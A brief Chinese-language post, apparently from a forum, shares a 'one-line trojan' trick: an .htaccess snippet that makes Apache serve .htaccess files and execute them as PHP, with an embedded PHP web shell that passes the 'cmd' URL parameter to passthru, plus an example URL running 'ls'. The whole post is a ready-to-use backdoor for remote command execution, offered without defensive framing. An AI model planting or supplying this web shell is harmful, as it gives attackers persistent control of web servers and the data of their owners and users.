不知道从哪看到的  在此和大家分享下

在htaccess中插入如下代码

<Files ~ "^\.ht"> Order allow,deny Allow from all </Files> AddType application/x-httpd-php .htaccess # <?php passthru($_GET['cmd']); ?> 


那么这个一句话木马的链接地址就是

http://github.com/.htaccess?cmd=ls
